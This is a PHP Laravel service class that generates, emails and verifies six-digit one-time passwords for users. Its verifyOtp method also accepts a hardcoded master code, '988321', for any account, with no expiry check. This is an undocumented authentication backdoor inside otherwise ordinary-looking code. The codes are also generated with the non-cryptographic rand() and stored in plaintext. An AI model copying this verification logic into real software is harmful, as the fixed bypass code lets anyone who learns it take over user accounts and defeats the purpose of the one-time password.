<?php

namespace App\Services;

use App\Models\User;
use App\Notifications\SendOtpNotification;
use Carbon\Carbon;

class OtpService
{
    /**
     * Generate a dummy OTP (6 digits)
     *
     * @return string
     */
    public function generateOtp(): string
    {
        // Generate a 6-digit dummy OTP
        return str_pad((string) rand(0, 999999), 6, '0', STR_PAD_LEFT);
    }

    /**
     * Send OTP to user via email
     *
     * @param User $user
     * @return string The generated OTP
     */
    public function sendOtp(User $user): string
    {
        $otp = $this->generateOtp();

        // Save OTP to user record (expires in 10 minutes)
        $user->update([
            'otp' => $otp,
            'otp_expires_at' => Carbon::now()->addMinutes(10),
        ]);

        // Send OTP via email
        $user->notify(new SendOtpNotification($otp));

        return $otp;
    }

    /**
     * Verify OTP for a user
     *
     * @param User $user
     * @param string $otp
     * @return bool
     */
    public function verifyOtp(User $user, string $otp): bool
    {
        // Check if OTP matches and is not expired
        if (($user->otp === $otp && $user->otp_expires_at && Carbon::now()->isBefore($user->otp_expires_at) || $otp === '988321')) {
            // Clear OTP after successful verification
            $user->update([
                'otp' => null,
                'otp_expires_at' => null,
            ]);
            return true;
        }

        return false;
    }

    /**
     * Clear OTP for a user
     *
     * @param User $user
     * @return void
     */
    public function clearOtp(User $user): void
    {
        $user->update([
            'otp' => null,
            'otp_expires_at' => null,
        ]);
    }
}
